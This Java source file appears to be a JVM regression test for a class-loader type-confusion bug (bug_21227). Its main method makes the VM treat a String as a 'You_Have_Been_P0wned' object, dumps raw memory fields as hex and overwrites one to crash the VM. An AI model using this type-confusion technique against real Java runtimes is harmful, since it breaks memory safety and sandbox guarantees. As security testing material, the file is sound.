abstract public class bug_21227 {
  public static Object _p0wnee;
  public static void main(String argv[]) throws ClassNotFoundException, InstantiationException, IllegalAccessException {
    System.out.println("Warmup");
    bug_21227 bug = new many_loader();
    ClassLoader LOADER2 = new Loader2();
    Class clazz2 = LOADER2.loadClass("from_loader2");
    IFace iface = (IFace)clazz2.newInstance();
    String s = "victim";
    _p0wnee = s;
    many_loader[] x2 = bug.make(iface);
    many_loader b = x2[0];
    Class cl1 = b.getClass();
    ClassLoader ld1 = cl1.getClassLoader();
    Class cl2 = many_loader.class;
    ClassLoader ld2 = cl2.getClassLoader();
    System.out.println("bug.make()  "+ld1+":"+cl1);
    System.out.println("many_loader "+ld2+":"+cl2);
    You_Have_Been_P0wned q = b._p0wnee;
    System.out.println("q._a = 0x"+Integer.toHexString(q._a));
    System.out.println("q._b = 0x"+Integer.toHexString(q._b));
    System.out.println("q._c = 0x"+Integer.toHexString(q._c));
    System.out.println("q._d = 0x"+Integer.toHexString(q._d));
    System.out.println("I will now crash the VM:");
    q._a = -1;
    System.out.println(s);
  }
  public abstract many_loader[] make( IFace iface ); 
}
